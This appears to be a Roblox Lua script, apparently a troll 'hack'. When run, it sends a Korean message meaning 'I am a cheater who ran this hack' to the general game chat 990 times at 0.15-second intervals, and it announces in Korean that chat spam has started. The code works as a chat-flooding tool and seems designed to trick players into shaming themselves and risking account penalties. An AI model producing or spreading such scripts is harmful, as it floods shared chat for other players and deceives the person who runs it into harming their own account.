local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local TextChatService = game:GetService("TextChatService")

local message = "저는 이 핵을 실행한 핵쟁이 입니다"

task.spawn(function()
    for i = 1, 990 do  
        pcall(function()
            if TextChatService.TextChannels.RBXGeneral then
                TextChatService.TextChannels.RBXGeneral:SendAsync(message)
            end
        end)
        task.wait(0.15)  
    end
end)

print("채팅 스팸 시작됨")
